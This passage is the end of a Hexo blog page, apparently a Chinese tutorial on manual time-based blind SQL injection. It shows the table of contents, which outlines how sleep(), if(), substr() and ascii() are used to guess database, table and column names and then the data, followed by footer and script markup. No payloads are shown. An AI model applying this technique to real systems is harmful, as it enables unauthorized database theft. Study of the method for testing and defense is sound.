+          二：时间延迟型手工注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sleep-%E5%87%BD%E6%95%B0%EF%BC%9A%E5%BB%B6%E8%BF%9Fmysql%E7%9A%84%E6%89%A7%E8%A1%8C%E6%97%B6%E9%97%B4if-expr1-expr2-expr3-%E4%B8%80%E8%88%AC%E4%B8%8Esleep-%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8%EF%BC%9B%E5%BD%93if-expr1%E4%B8%BA%E7%9C%9F%E7%9A%84%E6%97%B6%E5%80%99%E8%BF%94%E5%9B%9Eexpr2-%E5%BD%93if-expr1%E4%B8%BA%E5%81%87%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E8%BF%94%E5%9B%9Eexpr3length-%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E9%95%BF%E5%BA%A6substr-str-start-len-%E6%88%AA%E5%8F%96%E2%80%9Cstr%E2%80%9D%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%8E%E7%AC%AC%E2%80%9Cstart%E2%80%9D%E4%BD%8D%E5%BC%80%E5%A7%8B%E7%9A%84%E2%80%9Clen%E2%80%9D%E9%95%BF%E5%BA%A6%E7%9A%84%E5%AD%97%E7%AC%A6ascii-%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%AD%97%E7%AC%A6%E7%9A%84ascii%E7%A0%81%E5%80%BC"><span class="toc-number">10.</span> <span class="toc-text">
+          sleep()函数：延迟mysql的执行时间if(expr1,expr2,expr3):一般与sleep()函数进行配合使用；当if expr1为真的时候返回expr2;当if expr1为假的时候，返回expr3length()：返回字符串的长度substr(str,start,len):截取“str”字符串从第“start”位开始的“len”长度的字符ascii()：返回字符的ascii码值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A%E6%95%B0%E9%87%8F-gt-%E9%95%BF%E5%BA%A6-gt-%E5%85%B7%E4%BD%93%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97%E7%9A%84%E9%95%BF%E5%BA%A6%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%90%8D%E5%AD%97%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%9A%84%E4%B8%AA%E6%95%B0%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%E5%AD%97%E7%9A%84%E9%95%BF%E5%BA%A6%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%E5%AD%97%E8%8E%B7%E5%8F%96%E5%88%97%E7%9A%84%E4%B8%AA%E6%95%B0%E8%8E%B7%E5%8F%96%E5%88%97%E7%9A%84%E9%95%BF%E5%BA%A6%E8%8E%B7%E5%8F%96%E5%88%97%E7%9A%84%E5%85%B7%E4%BD%93%E5%90%8D%E5%AD%97%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E5%88%97%E6%95%B0%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E9%95%BF%E5%BA%A6%E8%8E%B7%E5%8F%96%E5%85%B7%E4%BD%93%E7%9A%84%E6%95%B0%E6%8D%AE-1"><span class="toc-number">11.</span> <span class="toc-text">
+          思路：数量&gt;长度&gt;具体获取数据库名字的长度获取数据库的名字获取数据表的个数获取数据表名字的长度获取数据表名字获取列的个数获取列的长度获取列的具体名字获取数据的列数获取数据的长度获取具体的数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E5%AF%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%8C%9C%E8%A7%A3-1"><span class="toc-number">12.</span> <span class="toc-text">
+          一：对数据库的猜解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E5%AF%B9%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%9A%84%E7%8C%9C%E8%A7%A3-1"><span class="toc-number">13.</span> <span class="toc-text">
+          二：对数据表的猜解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%EF%BC%9A%E5%AF%B9%E5%88%97%E5%90%8D%E7%9A%84%E7%8C%9C%E5%8F%96"><span class="toc-number">14.</span> <span class="toc-text">
+          三：对列名的猜取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE"><span class="toc-number">15.</span> <span class="toc-text">
+          四：猜解数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%B3%E6%AD%A4%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E5%9E%8B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%88%90"><span class="toc-number">16.</span> <span class="toc-text">
+          至此时间延迟型手工注入完成</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">110</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
